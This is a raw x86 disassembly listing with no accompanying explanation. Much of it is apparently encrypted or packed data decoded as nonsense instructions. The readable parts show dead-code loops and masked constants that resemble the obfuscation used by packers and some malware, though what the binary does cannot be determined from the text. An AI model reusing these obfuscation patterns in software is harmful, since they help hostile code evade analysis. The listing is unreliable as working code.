  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x1c7f5e11
  40597e:	xor    edi,eax
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	fidiv  WORD PTR [edi]
  405989:	xor    al,0x22
  40598b:	xchg   ebp,eax
  40598c:	or     ebp,esi
  40598e:	and    eax,0xc39e791f
  405993:	out    0x54,eax
  405995:	push   cs
  405996:	and    edi,DWORD PTR [ebx-0x59dfe04a]
  40599c:	xchg   dh,ah
  40599e:	(bad)  
  40599f:	frstor [edx+0x66f8723f]
  4059a5:	adc    ebp,DWORD PTR [edi-0x46]
  4059a8:	or     al,0xfe
  4059aa:	sub    DWORD PTR [ebp-0x2446a0d6],esi
  4059b0:	sub    BYTE PTR [ecx],cl
  4059b2:	popf   
  4059b3:	inc    edi
  4059b4:	push   cs
  4059b5:	cwde   
  4059b6:	stos   BYTE PTR es:[edi],al
  4059b7:	dec    esp
  4059b8:	push   esp
  4059b9:	sbb    DWORD PTR [eax-0x1e],0x60
  4059bd:	or     edi,DWORD PTR [ebp-0x5576a448]
  4059c3:	mov    ecx,0x5f095f21
  4059c8:	dec    ebx
  4059c9:	test   BYTE PTR [eax-0x36],cl
  4059cc:	mul    esi
  4059ce:	jns    0x40599a
  4059d0:	and    al,BYTE PTR [edi+0x2028bbd1]
  4059d6:	dec    edi
  4059d7:	ret    0xa236
  4059da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059db:	pop    ss
  4059dc:	inc    edi
  4059dd:	and    DWORD PTR [edi-0x1a508dac],ebp
  4059e3:	cmc    
  4059e4:	mov    al,0x24
  4059e6:	bswap  edi
  4059e8:	fisubr WORD PTR fs:[ebp+0x70]
  4059ec:	pop    ss
  4059ed:	pop    esi
  4059ee:	daa    
  4059ef:	cs add eax,0x885cd51a
  4059f5:	rcr    al,0xe9
  4059f8:	fmul   QWORD PTR [ebp-0x75]
  4059fb:	repnz push es
  4059fd:	bound  edi,QWORD PTR [eax+0x5b]
  405a00:	inc    edi
  405a01:	mov    ds:0x206d87e2,eax
  405a06:	adc    DWORD PTR [edx],edx
  405a08:	push   ss
  405a09:	mov    ch,0xfb
  405a0b:	push   ebp
  405a0c:	xchg   esi,eax
  405a0d:	inc    edi
  405a0e:	xchg   ebp,eax
  405a0f:	int3   
  405a10:	mov    ebx,0xb0e16c2b
  405a15:	sub    al,0x22
  405a17:	retf   
  405a18:	mov    ss,WORD PTR [edi+edi*8+0x4b713834]
  405a1f:	retf   
  405a20:	adc    eax,0x85edf152
  405a25:	add    al,dl
  405a27:	sbb    al,0xce
  405a29:	mov    eax,0x8bf8a0bf
  405a2e:	adc    ebx,DWORD PTR [ebx]
  405a30:	fucomip st,st(4)
  405a32:	lods   al,BYTE PTR ds:[esi]
  405a33:	xchg   ebx,eax
  405a34:	jmp    0xae7a4d34
  405a39:	aaa    
  405a3a:	aad    0x76
  405a3c:	jecxz  0x405a4c
  405a3e:	xor    dl,cl
  405a40:	jl     0x4059fa
  405a42:	mov    bh,BYTE PTR [ecx+0x7fedc418]
  405a48:	sub    edx,DWORD PTR [esi+0x78b2cbc9]
  405a4e:	mov    al,ds:0x953176b1
  405a53:	cmp    BYTE PTR [edi+0x2ab3d0a6],cl
  405a59:	xor    edx,edi
  405a5b:	dec    ebp
  405a5c:	jmp    0x405a6d
  405a5e:	sti    
  405a5f:	cmp    ch,dh
  405a61:	inc    esp
  405a62:	push   eax
  405a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a64:	xchg   ebx,eax
  405a65:	push   ds
  405a66:	in     eax,0xf7
  405a68:	aas    
  405a69:	cdq    
  405a6a:	sub    eax,0x27e6c9f8
  405a6f:	mov    ch,0x1a
  405a71:	lahf   
  405a72:	data16 xor al,BYTE PTR [esi+0x5b]
  405a76:	cwde   
  405a77:	stos   DWORD PTR es:[edi],eax
  405a78:	inc    ebp
  405a79:	dec    esi
  405a7a:	jmp    0x4e58cab9
  405a7f:	jmp    0x8b54:0x35d5
  405a85:	mov    BYTE PTR [ebx-0x59a5439e],ah
  405a8b:	sub    BYTE PTR [ebx-0x34],dh
  405a8e:	xor    al,bh
  405a90:	push   esi
  405a91:	dec    edi
  405a92:	push   eax
  405a93:	leave  
  405a94:	fcom   QWORD PTR [eax+0x3c8266c5]
  405a9b:	lods   eax,DWORD PTR ds:[esi]
  405a9c:	pop    es
  405a9d:	leave  
  405a9e:	mov    al,0x26
  405aa0:	aam    0x11
  405aa2:	loope  0x405a43
  405aa4:	rol    DWORD PTR [edx],1
  405aa6:	pop    ss
  405aa7:	iret   
  405aa8:	adc    al,0x80
  405aaa:	push   ebp
  405aab:	jle    0x405a73
  405aad:	aad    0xae
  405aaf:	add    BYTE PTR [esi+0x75],ch
  405ab2:	scas   al,BYTE PTR es:[edi]
  405ab3:	enter  0x4046,0xa3
  405ab7:	push   ss
  405ab8:	sbb    BYTE PTR [esi-0x38],al
  405abb:	inc    ebp
  405abc:	in     al,0xeb
  405abe:	sub    eax,0x1683fdd0
  405ac3:	jmp    0xa695:0x756300f6
  405aca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405acb:	lea    ebp,[esi+0x27]
  405ace:	push   0x69
  405ad0:	and    BYTE PTR [eax-0x4a],ah
  405ad3:	mov    ecx,0x7264fca9
  405ad8:	div    ecx
  405ada:	mov    ecx,DWORD PTR [ebp+0x10]
  405add:	and    ecx,eax
  405adf:	or     ecx,0x81161d8f
  405ae5:	mov    eax,ecx
  405ae7:	pop    ebp
  405ae8:	ret    0x18
  405aeb:	push   ebp
  405aec:	mov    ebp,esp
  405aee:	push   ecx
  405aef:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405af6:	add    DWORD PTR ds:0x43441d,ecx
  405afc:	mov    eax,DWORD PTR [ebp-0x4]
  405aff:	mov    edx,DWORD PTR [ebp+0x10]
  405b02:	mov    ecx,DWORD PTR ds:0x4343a6
  405b08:	mov    ecx,DWORD PTR [ecx]
  405b0a:	add    DWORD PTR ds:0x434429,ecx
  405b10:	mov    ecx,0x7510855
  405b15:	xor    eax,ecx
  405b17:	sub    DWORD PTR ds:0x432dce,0x487f
  405b21:	add    eax,0x32729c
  405b26:	xor    DWORD PTR ds:0x434396,0x6d44
  405b30:	mov    DWORD PTR [edx],eax
  405b32:	inc    DWORD PTR ds:0x43436e
  405b38:	mov    eax,DWORD PTR [ebp+0x14]
  405b3b:	sub    DWORD PTR ds:0x432dc2,0x7e8e
  405b45:	mov    edx,DWORD PTR [ebp+0x10]
  405b48:	mov    DWORD PTR [edx+0x4],eax
  405b4b:	mov    eax,DWORD PTR [ebp+0x18]
  405b4e:	mov    edx,DWORD PTR [ebp+0x10]
  405b51:	adc    DWORD PTR ds:0x43436e,0x4326fc
  405b5b:	mov    DWORD PTR [edx+0x8],eax
  405b5e:	mov    eax,DWORD PTR [ebp+0x1c]
  405b61:	mov    edx,DWORD PTR [ebp+0x10]
  405b64:	sub    DWORD PTR ds:0x432dc6,0x432dda
  405b6e:	mov    DWORD PTR [edx+0xc],eax
  405b71:	and    DWORD PTR ds:0x434376,0x0
  405b7b:	jmp    0x405b8b
  405b80:	mov    eax,ds:0x434376
  405b85:	inc    eax
  405b86:	mov    ds:0x434376,eax
  405b8b:	cmp    DWORD PTR ds:0x434376,0x14
  405b92:	jae    0x405bcd
  405b98:	cmp    DWORD PTR ds:0x434376,0x7
  405b9f:	jne    0x405bb0
  405ba5:	push   0x400000
  405baa:	call   DWORD PTR ds:0x432cee
  405bb0:	cmp    DWORD PTR ds:0x434376,0x6
  405bb7:	jne    0x405bc8
  405bbd:	mov    eax,ds:0x434376
  405bc2:	inc    eax
  405bc3:	mov    ds:0x434376,eax
  405bc8:	jmp    0x405b80
  405bcd:	mov    eax,DWORD PTR [ebp+0x20]
  405bd0:	mov    edx,DWORD PTR [ebp+0x10]
  405bd3:	mov    DWORD PTR [edx+0x10],eax
  405bd6:	mov    eax,eax
  405bd8:	mov    eax,DWORD PTR [ebp+0x14]
  405bdb:	test   eax,eax
  405bdd:	mov    eax,DWORD PTR [ebp+0x8]
  405be0:	jne    0x405be9
  405be6:	mov    eax,DWORD PTR [ebp+0xc]
  405be9:	xor    eax,ecx
  405beb:	add    eax,0x32729c
  405bf0:	leave  
  405bf1:	ret    0x1c
  405bf4:	push   ebp
  405bf5:	mov    ebp,esp
  405bf7:	sub    esp,0x78
  405bfa:	add    DWORD PTR ds:0x434382,edi
  405c00:	mov    eax,ds:0x4161a0
  405c05:	sbb    DWORD PTR ds:0x432dd2,0x30a0
  405c0f:	mov    DWORD PTR [ebp-0x10],eax
  405c12:	and    DWORD PTR ds:0x434372,0x0
  405c1c:	jmp    0x405c2c
  405c21:	mov    eax,ds:0x434372
  405c26:	inc    eax
  405c27:	mov    ds:0x434372,eax
  405c2c:	cmp    DWORD PTR ds:0x434372,0x12
  405c33:	jae    0x405cc7
  405c39:	cmp    DWORD PTR ds:0x434372,0x8
  405c40:	jne    0x405c56
  405c46:	push   0x59ce
  405c4b:	push   0x3d0e
  405c50:	call   DWORD PTR ds:0x4329c6
  405c56:	cmp    DWORD PTR ds:0x434372,0x7
  405c5d:	jne    0x405c71
  405c63:	xor    eax,eax
  405c65:	or     eax,DWORD PTR ds:0x434372
  405c6b:	inc    eax
  405c6c:	mov    ds:0x434372,eax
  405c71:	jmp    0x405c21
  405c76:	and    DWORD PTR ds:0x4326ec,0x0
  405c80:	jmp    0x405c93
  405c85:	xor    eax,eax
  405c87:	add    eax,DWORD PTR ds:0x4326ec
  405c8d:	inc    eax
  405c8e:	mov    ds:0x4326ec,eax
  405c93:	cmp    DWORD PTR ds:0x4326ec,0x19
  405c9a:	jae    0x405cc7
  405ca0:	cmp    DWORD PTR ds:0x4326ec,0x24
  405ca7:	jne    0x405cb8
  405cad:	push   0x2979
  405cb2:	call   DWORD PTR ds:0x432cf2
  405cb8:	jmp    0x405c85
  405cbd:	adc    DWORD PTR ds:0x432700,0x4b3c
  405cc7:	mov    eax,ds:0x4162ac
  405ccc:	mov    DWORD PTR [ebp-0x30],eax
  405ccf:	mov    eax,ds:0x43439a
  405cd4:	adc    DWORD PTR ds:0x434372,eax
  405cda:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  405ce1:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  405ce8:	and    DWORD PTR ds:0x432dce,0x0
  405cf2:	jmp    0x405d05
  405cf7:	xor    eax,eax
  405cf9:	xor    eax,DWORD PTR ds:0x432dce
  405cff:	inc    eax
  405d00:	mov    ds:0x432dce,eax
  405d05:	cmp    DWORD PTR ds:0x432dce,0x17
  405d0c:	jae    0x405d74
  405d12:	cmp    DWORD PTR ds:0x432dce,0x24
  405d19:	jne    0x405d65
  405d1f:	push   0x4328ab
  405d24:	push   DWORD PTR [ebp-0x24]
  405d27:	push   DWORD PTR [ebp-0x1c]
  405d2a:	push   0x2bca
  405d2f:	push   0x26af
  405d34:	push   0x4217
  405d39:	push   0x24e1
  405d3e:	push   0x5f7a
  405d43:	push   DWORD PTR [ebp-0x28]
  405d46:	push   0x4151
  405d4b:	push   0x4efd
  405d50:	push   0x2a4d
  405d55:	push   0x1961
  405d5a:	push   0x8799
  405d5f:	call   DWORD PTR ds:0x432c36
  405d65:	jmp    0x405cf7
  405d6a:	sbb    DWORD PTR ds:0x432dca,0x4665
  405d74:	mov    eax,DWORD PTR [ebp-0xc]
  405d77:	push   ebx
  405d78:	sbb    DWORD PTR ds:0x43442d,0x432dd2
  405d82:	push   esi
  405d83:	push   edi
  405d84:	mov    esi,0x7510855
  405d89:	and    DWORD PTR ds:0x4326fc,0xdb
  405d93:	jmp    0x4060e0
  405d98:	mov    ecx,0x75ce7592
  405d9d:	jmp    0x6331ef03
  405da2:	sub    BYTE PTR [ebx],bl
  405da4:	aaa    
  405da5:	stos   DWORD PTR es:[edi],eax
  405da6:	iret   
  405da7:	ror    BYTE PTR [ebx+0x20707034],0x7d
  405dae:	jo     0x405e20
  405db0:	test   eax,0xfac6350e
  405db5:	jbe    0x405dfa
  405db7:	rcr    BYTE PTR [ebp-0x38b228a6],cl
  405dbd:	(bad)  
  405dbf:	mov    esp,eax
  405dc1:	push   ds
  405dc2:	fstp   TBYTE PTR [eax+0x7b]
  405dc5:	cmp    ch,dh
  405dc7:	lds    eax,FWORD PTR [esp+esi*8]
  405dca:	sub    ebx,DWORD PTR [ebp-0x6fb8cdeb]
  405dd0:	xor    ebx,DWORD PTR [eax]
  405dd2:	jge    0x405dde
  405dd4:	pop    es
  405dd5:	mov    ah,0x4e
  405dd7:	sar    DWORD PTR [edi+0x75e5c26a],cl
  405ddd:	adc    ah,bh
  405ddf:	xchg   esp,eax
  405de0:	adc    eax,0x96bdad8c
  405de5:	lock mov ah,0xc0
  405de8:	and    al,0x6a
  405dea:	mov    cl,0xef
  405dec:	cdq    
  405ded:	cmp    al,0xc1
  405def:	sub    DWORD PTR [eax],0x29b4d49b
  405df5:	or     DWORD PTR [edi],edx
  405df7:	cmp    cl,BYTE PTR [edi+0x11]
  405dfa:	stos   DWORD PTR es:[edi],eax
  405dfb:	bound  edi,QWORD PTR [esp+ebp*1+0xb2b64a6]
  405e02:	mov    ecx,0x362ace05
  405e07:	retf   
  405e08:	xor    DWORD PTR [esi*1+0x11b735cc],ecx
  405e0f:	imul   ebp,DWORD PTR [ecx],0xd4717e65
  405e15:	mov    ds:0x64f49546,eax
  405e1a:	or     edx,ecx
  405e1c:	adc    BYTE PTR [ebx-0x275bdbe8],0xc1
  405e23:	pusha  
  405e24:	mov    ebx,DWORD PTR [ecx+0x7bbcb23e]
  405e2a:	or     al,BYTE PTR [ebp+esi*1+0x131bcea7]
  405e31:	(bad)  
  405e32:	adc    DWORD PTR [ecx-0x1cd6499a],edx
  405e38:	cmp    eax,0x495c362
  405e3d:	dec    edi
  405e3e:	(bad)  
  405e3f:	jg     0x405e1e
  405e41:	mov    eax,ds:0x7bb545d0
  405e46:	in     eax,dx
  405e47:	xor    ecx,DWORD PTR ds:[ebp-0x66164a83]
  405e4e:	ret    
  405e4f:	stc    
  405e50:	xor    BYTE PTR [esi+edx*2-0x4a6898ac],cl
  405e57:	pop    edx
  405e58:	imul   esi,DWORD PTR [ebp-0x6e],0x1a
  405e5c:	lods   al,BYTE PTR ds:[esi]
  405e5d:	cmp    al,0xd
  405e5f:	and    dh,BYTE PTR [esi+ebx*2-0x54]
  405e63:	jmp    0x29f8:0x6feb56cc
  405e6a:	retf   0x4f8c
  405e6d:	or     dl,al
  405e6f:	xor    dh,BYTE PTR [edx-0xf8caa84]
  405e75:	jnp    0x405e7a
  405e77:	mov    ?,ebp
  405e79:	mov    esp,0xd64b6b57
  405e7e:	mov    ecx,0x942eb49e
  405e83:	ss jmp 0x89cf:0x6da994fc
  405e8b:	dec    eax
  405e8c:	loope  0x405e4c
  405e8e:	sbb    BYTE PTR ds:0x5eab569d,ah
  405e94:	imul   edi,DWORD PTR [eax-0x29],0x1f049f65
  405e9b:	pop    esi
  405e9c:	repz xchg eax,eax
  405e9f:	pop    ebp
  405ea0:	mov    ebx,DWORD PTR [edi]
  405ea2:	mov    dh,BYTE PTR [eax-0x7]
  405ea5:	(bad)  
  405ea6:	push   edx
  405ea7:	scas   eax,DWORD PTR es:[edi]
  405ea8:	xor    al,0x51
  405eab:	jecxz  0x405f01
  405ead:	adc    BYTE PTR [eax],bh
  405eaf:	pop    eax
  405eb0:	xor    dh,BYTE PTR [esi+0x3cf74d5c]
  405eb6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  405eb8:	cmp    esp,DWORD PTR [eax+0x337190b0]
  405ebe:	jo     0x405e4e
  405ec0:	es push edx
  405ec2:	add    DWORD PTR [edi+0x52abb395],ebp
  405ec8:	loop   0x405e6c
  405eca:	leave  
  405ecb:	xchg   ebx,eax
  405ecc:	mov    ah,0xfa
  405ece:	xchg   ebp,eax
  405ecf:	or     ebp,DWORD PTR [eax+0x13915783]
  405ed5:	jl     0x95510f40
  405edb:	cmp    edi,edx
  405edd:	stos   BYTE PTR es:[edi],al
  405ede:	test   al,0xf2
  405ee0:	add    al,0xc
  405ee2:	mov    eax,ds:0x6ae9ba6d
  405ee7:	(bad)  
  405ee8:	or     BYTE PTR [ecx],bl
  405eea:	xor    DWORD PTR [ecx+0x75a507cd],edx
  405ef0:	and    DWORD PTR [esi-0x9c2270e],edi
  405ef6:	ret    0x5ecb
  405ef9:	and    DWORD PTR [edx+ebx*1+0x5fc44307],edx
  405f00:	ret    0x1d7a
  405f03:	and    ah,bh
  405f05:	push   0x5f
  405f07:	dec    ebx
  405f08:	xchg   esi,eax
  405f09:	add    ecx,DWORD PTR [edi+0x7a29de88]
  405f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f10:	icebp  
  405f11:	dec    edi
  405f12:	dec    ecx
  405f13:	xlat   BYTE PTR ds:[ebx]
  405f14:	xchg   esp,eax
  405f15:	int    0xab
  405f17:	jnp    0x405f11
  405f19:	mov    ecx,0xd28ccfe0
  405f1e:	jne    0x405f6d
  405f20:	push   esi
  405f21:	ins    DWORD PTR es:[edi],dx
  405f22:	mov    dl,0xbd
  405f24:	into   
  405f25:	sbb    al,0x6f
  405f27:	shl    DWORD PTR [eax-0x77e6f606],1
  405f2d:	mov    WORD PTR [edi+esi*1],?
  405f30:	jae    0x405f0e
  405f32:	mov    edi,0xc71c6439
  405f37:	inc    ebp
  405f38:	fmul   st(7),st
  405f3a:	jecxz  0x405eed
  405f3c:	(bad)
  405f40:	fldenv [ebp-0x64e8444]
  405f46:	std    
  405f47:	clc    
  405f48:	sbb    ebx,eax
  405f4a:	push   edi
  405f4b:	sub    BYTE PTR [esi-0x1a5126dd],bh
  405f51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f52:	push   0x277f0ef2
  405f57:	vandps ymm6,ymm7,YMMWORD PTR [eax-0x30763a30]
  405f5f:	push   ss
  405f60:	jne    0x405f08
  405f62:	dec    esi
  405f63:	jno    0x405fd6
  405f65:	or     eax,0xd6dba3a1
  405f6a:	addr16 dec ebp
  405f6c:	mov    esp,0xf60eec28
  405f71:	(bad)  
  405f72:	call   0xcaf7:0x9fbd8f99
  405f79:	ss push ebp
  405f7b:	or     DWORD PTR [eax],eax
  405f7d:	retf   
  405f7e:	push   ss
  405f7f:	cli    
  405f80:	add    ecx,DWORD PTR [edx+0x39d728fc]
  405f86:	jmp    0x3ba0:0x4842bd74
  405f8d:	dec    eax
  405f8e:	aam    0x4d
  405f90:	jmp    0xaca1f3df
  405f95:	cmp    al,0xff
  405f97:	dec    ecx
  405f98:	add    ah,BYTE PTR [ecx-0x460acee2]
  405f9e:	jle    0x405f3a
  405fa0:	dec    esi
  405fa1:	adc    esi,ebp
  405fa3:	(bad)  
  405fa4:	xchg   esi,eax
  405fa5:	rcr    BYTE PTR [ecx],1
  405fa7:	gs mov dl,0x73
  405faa:	mov    al,0xfc
  405fac:	push   edx
  405fad:	js     0x405ffb
  405faf:	idiv   BYTE PTR [edx]
  405fb1:	jle    0x406031
  405fb3:	sbb    ah,cl
  405fb5:	fwait
  405fb6:	les    esi,FWORD PTR [esi-0x9]
  405fb9:	cdq    
  405fba:	jle    0x405f99
  405fbc:	push   eax
  405fbd:	ficomp WORD PTR [edi]
  405fbf:	inc    ebx
  405fc0:	fld    DWORD PTR [ebp+0x44dd162c]
  405fc6:	test   DWORD PTR [edx+0x26558c5b],ebx
  405fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fcd:	int3   
  405fce:	push   ebp
  405fcf:	in     eax,dx
  405fd0:	cmp    edx,DWORD PTR [edi]
  405fd2:	gs sub al,0xef
  405fd5:	clc    
  405fd6:	push   eax
  405fd7:	inc    edi
  405fd8:	lds    edi,FWORD PTR [edi]
  405fda:	pop    ecx
  405fdb:	pop    eax
  405fdc:	div    DWORD PTR [ecx+edi*4+0x3a]
  405fe0:	call   0x7324:0xc7e4e5a5
  405fe7:	in     eax,0xc2
  405fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fea:	mov    WORD PTR [ebx+0x53],?
  405fed:	inc    ecx
  405fee:	jle    0x40603f
  405ff0:	sub    ecx,DWORD PTR [esi+0x13220cbf]
  405ff6:	(bad)  
  405ff7:	adc    esi,DWORD PTR [ebp+0x7d]
  405ffa:	xchg   DWORD PTR [edi-0x2bdc091f],esi
  406000:	aas    
  406001:	js     0x406033
  406003:	test   eax,0x8d7e2b38
  406008:	in     eax,0x8
  40600a:	jo     0x405fbf
  40600c:	and    BYTE PTR [ecx-0x5],dl
  40600f:	sub    al,BYTE PTR [ebx]
  406011:	cs iret 
  406013:	xchg   edx,eax
  406014:	mov    ebx,0xf6691904
  406019:	dec    esi
  40601a:	cmp    ebp,DWORD PTR [ebx]
  40601c:	jl     0x406037
  40601e:	mov    edi,0x4cc3967f
  406023:	icebp  
  406024:	mov    DWORD PTR [eax+0x48e12c9c],ecx
  40602a:	cmc    
  40602b:	sbb    al,0x90
  40602d:	adc    al,0xcb
  40602f:	ret    
  406030:	adc    BYTE PTR [edx-0x791b77aa],0x29
  406037:	test   eax,0xaf31f993
  40603c:	sub    edi,DWORD PTR [esi-0x6eacb375]
  406042:	xchg   esi,eax
  406043:	push   cs
  406044:	dec    edi
  406045:	pop    ebx
  406046:	pushf  
  406047:	ror    DWORD PTR [ebp-0x60],1
  40604a:	jge    0x406008
  40604c:	fsubr  st,st(5)
  40604e:	xchg   ecx,eax
  40604f:	jmp    FWORD PTR [ebx]
  406051:	rcl    DWORD PTR [esi-0x51],cl
  406054:	dec    eax
  406055:	xchg   ecx,eax
  406056:	out    dx,al
  406057:	shl    DWORD PTR [edi-0x3e3c6030],0xe8
  40605e:	adc    DWORD PTR [edx-0x328e7b61],ecx
  406064:	(bad)  
  406065:	push   0xa05f52be
  40606a:	imul   edx,DWORD PTR [edi+0x3afe792b],0x51
  406071:	dec    eax
  406072:	mov    edi,edi
  406074:	ins    DWORD PTR es:[edi],dx
  406075:	sub    DWORD PTR [ebx-0x3fc47b10],ebx
  40607b:	ja     0x40604d
  40607d:	or     DWORD PTR [edi],ebx
  40607f:	es das 
  406081:	xchg   dl,dl
  406083:	adc    dh,BYTE PTR [edx-0x57a21941]
  406089:	pop    ss
  40608a:	test   eax,0xae448a1b
  40608f:	pop    edx
  406090:	sbb    al,0xcc
  406092:	xchg   dl,ch
  406094:	sub    dh,cl
  406096:	push   esp
  406097:	dec    esi
  406098:	xchg   edx,eax
  406099:	icebp  
  40609a:	cmp    eax,0x5959ed12
  40609f:	push   ds
  4060a0:	not    DWORD PTR [ebx-0x65]
  4060a3:	and    eax,0x91dd94b1
  4060a8:	ror    DWORD PTR [esi],0x4d
  4060ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ac:	ins    DWORD PTR es:[edi],dx
  4060ad:	or     BYTE PTR [eax+eax*8],dl
  4060b0:	(bad)  
  4060b1:	imul   eax,DWORD PTR [esi+0xc6ba8ed],0xfe766408
  4060bb:	jae    0x406067
  4060bd:	mov    cl,0x7a
  4060bf:	sbb    eax,0xe66ec023
  4060c4:	mov    al,0xae
  4060c6:	add    ah,bh
  4060c8:	push   ecx
  4060c9:	jne    0x4060eb
  4060cb:	ins    BYTE PTR es:[edi],dx
  4060cc:	test   DWORD PTR [edi+0x4c4390ab],0x403f1734
  4060d6:	ffree  st(3)
  4060d8:	jl     0x406100
  4060da:	hlt    
  4060db:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4060dd:	(bad)  
  4060de:	fwait
  4060df:	cwde   
  4060e0:	xor    eax,esi
  4060e2:	add    DWORD PTR ds:0x432dbe,edi
  4060e8:	mov    edi,0x32729c
  4060ed:	and    DWORD PTR ds:0x43441d,0x3e7d
  4060f7:	add    eax,edi
  4060f9:	jmp    0x406446
  4060fe:	xchg   esp,eax
  4060ff:	test   eax,0x69f5e9e0
  406104:	xchg   ecx,eax
  406105:	jno    0x406179
  406107:	xchg   edx,eax
  406108:	js     0x406147
  40610a:	dec    ebp
  40610b:	sbb    eax,0x31bb4ee9
  406110:	jo     0x406182
  406112:	and    BYTE PTR [ebp+0x70],bh
  406115:	jo     0x4060b8
  406117:	jns    0x406123
  406119:	fsubr  st,st(6)
  40611b:	add    BYTE PTR [edx],ah
  40611d:	out    dx,al
  40611e:	scas   al,BYTE PTR es:[edi]
  40611f:	add    edi,DWORD PTR [esi+ebx*4+0x4d]
  406123:	sub    eax,0x4f542609
  406128:	jg     0x406138
  40612a:	sbb    BYTE PTR [eax+0x495dc1d9],bh
  406130:	fsubp  st(6),st
  406132:	xchg   edx,eax
  406133:	add    ebp,0x8505d8e4
  406139:	cmp    ecx,ecx
  40613b:	xor    al,0x82
  40613d:	mov    cl,0x25
  40613f:	xchg   edx,eax
  406140:	add    bh,BYTE PTR [edi+0x1cba0f2b]
  406146:	xchg   ebp,eax
  406147:	xchg   BYTE PTR [edx],cl
  406149:	aam    0x5d
  40614b:	dec    esi
  40614c:	popf   
  40614d:	dec    ebx
  40614e:	adc    BYTE PTR [ecx+esi*1],ah
  406151:	push   edx
  406152:	dec    esp
  406153:	fcmove st,st(5)
  406155:	push   ss
  406156:	push   ss
  406157:	jmp    0xe97f0ca
  40615c:	pushf  
  40615d:	mov    ebp,0xa6167cda
  406162:	and    ch,BYTE PTR [ecx]
  406164:	mov    dl,0xcc
  406166:	fwait
  406167:	add    BYTE PTR [ebx],cl
  406169:	jno    0x406196
  40616b:	mov    ch,0xdd
  40616d:	mov    bl,0x6b
  40616f:	xchg   BYTE PTR [eax],bh
  406171:	push   eax
  406172:	test   DWORD PTR [esi],esp
  406174:	cmp    eax,ebp
  406176:	sbb    al,0xd8
  406178:	cmp    al,0x9f
  40617a:	add    bh,BYTE PTR [ebx-0x1]
  40617d:	inc    ebp
  40617e:	inc    edx
  40617f:	pusha  
  406180:	jmp    0x97a0ec0b
  406185:	sar    eax,0xab
  406188:	inc    ebx
  406189:	inc    eax
  40618a:	and    DWORD PTR [ebx],ecx
  40618c:	push   es
  40618d:	mov    eax,0xb5f6d7e9
  406192:	jle    0x406118
  406194:	mov    edi,0x660f1cba
  406199:	push   edi
  40619a:	inc    esp
  40619b:	in     eax,dx
  40619c:	jbe    0x40613b
  40619e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40619f:	test   al,0xf1
  4061a1:	push   edi
  4061a2:	int3   
  4061a3:	jle    0x40615f
  4061a5:	pop    eax
  4061a6:	jmp    0x4061d3
  4061a8:	jp     0x4061f3
  4061aa:	(bad)  
  4061ab:	test   al,0x10
  4061ad:	dec    esi
  4061ae:	jp     0x40616f
  4061b0:	imul   ebx,esi,0x66
  4061b3:	xor    ch,BYTE PTR [edx-0xf]
  4061b6:	mov    esi,0x5b1117a3
  4061bb:	adc    DWORD PTR [eax-0x22],edi
  4061be:	add    eax,0xe8e05adf
  4061c3:	pop    edx
  4061c4:	(bad)  
  4061c5:	jge    0x406149
  4061c7:	retf   0xe1f5
  4061ca:	jne    0x4061b4
  4061cc:	rcr    DWORD PTR [esi-0x7e6cf7ef],cl
  4061d2:	adc    edx,eax
  4061d4:	mov    eax,0xeb167d91
  4061d9:	shr    BYTE PTR [edi+0x60],0xa1
  4061dd:	xor    dl,BYTE PTR [eax+0xb415234]
  4061e3:	stos   BYTE PTR es:[edi],al
  4061e4:	jp     0x4061d9
  4061e6:	cmc    
  4061e7:	cmp    bl,BYTE PTR [esi-0x70]
  4061ea:	repnz mov ebp,0xf1e9a41c
  4061f0:	or     DWORD PTR [ebx+0x2e],0x6dd1ac10
  4061f7:	popa   
  4061f8:	cmp    al,0x27
  4061fa:	and    bh,BYTE PTR [edi-0x5d]
  4061fd:	lock mov edi,0x39add97d
  406203:	sar    DWORD PTR [ebx+0x14],cl
  406206:	ror    DWORD PTR ds:0x79202238,0xde
  40620d:	call   0x21d:0x70c7e84
  406214:	mov    eax,0x505710f4
  406219:	pop    edx
  40621a:	out    0x54,eax
  40621c:	sti    
  40621d:	xchg   edi,eax
  40621e:	mov    dl,0xf
  406220:	popa   
  406221:	fsubp  st(5),st
  406223:	cwde   
  406224:	lock dec ebx
  406226:	mov    cl,0x11
  406228:	jecxz  0x4061c5
  40622a:	pop    eax
  40622b:	sub    al,0x8f
  40622d:	push   ds
  40622e:	push   esi
  40622f:	jecxz  0x40623a
  406231:	test   al,0x3f
  406233:	push   cs
  406234:	mov    eax,ds:0xcab3f815
  406239:	jg     0x4062a5
  40623b:	(bad)  
  40623c:	push   esp
  40623d:	shl    cl,1
  40623f:	(bad)  
  406240:	(bad)  
  406241:	stos   BYTE PTR es:[edi],al
  406242:	add    eax,0x8f060062
  406247:	mov    bh,0x5a
  406249:	push   ss
  40624a:	ret    0x1031
  40624d:	push   ebx
  40624e:	shl    BYTE PTR [ebp-0x64],0xc0
  406252:	push   edx
  406253:	out    dx,al
  406254:	and    cl,BYTE PTR [esi-0x554beda2]
  40625a:	aas    
  40625b:	loop   0x4061ef
  40625d:	and    BYTE PTR [ebp-0x1638e987],ah
  406263:	test   BYTE PTR [edi+0x5a],0xb9
  406267:	je     0x40620f
  406269:	out    dx,al
  40626a:	fcmovb st,st(6)
  40626c:	outs   dx,DWORD PTR ds:[esi]
  40626d:	leave  
  40626e:	cmp    al,0xf6
  406270:	mov    WORD PTR [esi-0x7a0d3a22],?
  406276:	xlat   BYTE PTR ds:[ebx]
